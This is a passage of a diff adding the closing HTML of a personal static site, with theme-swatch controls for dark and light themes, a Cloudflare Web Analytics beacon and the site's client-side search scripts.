+                    <div style="height: 100%; width:25%; background-color: var(--highlight-color-alt, #000000)"></div>
+                  </div>
+                  <span style="color:  var(--background-color, #000000)"> Dark </span>
+              </div>
+            </div>
+          
+            <div class="swatch-child" onclick="setTheme('Light')">
+                <div style="text-align: center;">
+                  <div data-theme=Light class="swatch">
+                    <div style="height: 100%; width:25%; background-color: var(--background-color, #000000)"></div>
+                    <div style="height: 100%; width:25%; background-color: var(--foreground-color, #000000)"></div>
+                    <div style="height: 100%; width:25%; background-color: var(--highlight-color, #000000)"></div>
+                    <div style="height: 100%; width:25%; background-color: var(--highlight-color-alt, #000000)"></div>
+                  </div>
+                  <span style="color:  var(--background-color, #000000)"> Light </span>
+              </div>
+            </div>
+          
+      </div>
+    </details>
+
+    <!-- Cloudflare Web Analytics -->
+    <script defer src='https://static.cloudflareinsights.com/beacon.min.js' data-cf-beacon='{"token": "1e533cda4e344b0bb7c6bf7aef70a519"}'></script>
+    <!-- End Cloudflare Web Analytics -->
+
+    <script type="text/javascript" src="https://tsheinen.github.io/elasticlunr.min.js"></script>
+    <script type="text/javascript" src="https://tsheinen.github.io/search_index.en.js"></script>
+    <script type="text/javascript" src="https://tsheinen.github.io/js/search.js"></script>
+</body>
+</html>
